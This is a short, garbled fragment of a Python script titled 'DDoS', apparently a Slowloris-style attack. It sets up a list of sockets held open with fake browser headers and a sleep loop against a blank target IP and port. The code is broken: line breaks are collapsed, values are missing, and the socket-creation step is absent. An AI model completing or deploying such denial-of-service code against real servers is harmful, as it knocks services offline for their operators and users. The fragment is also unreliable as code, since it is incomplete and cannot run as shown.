# DDoS
import socket import random import time import sys  target_ip = ""  port =  connection_count =  sockets_list = [] regular_headers = [     "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",     "Accept-language: en-US,en;q=0.5" ]  def init_socket(ip):     try:  if s:             sockets_list.append(s)     time.sleep(15)
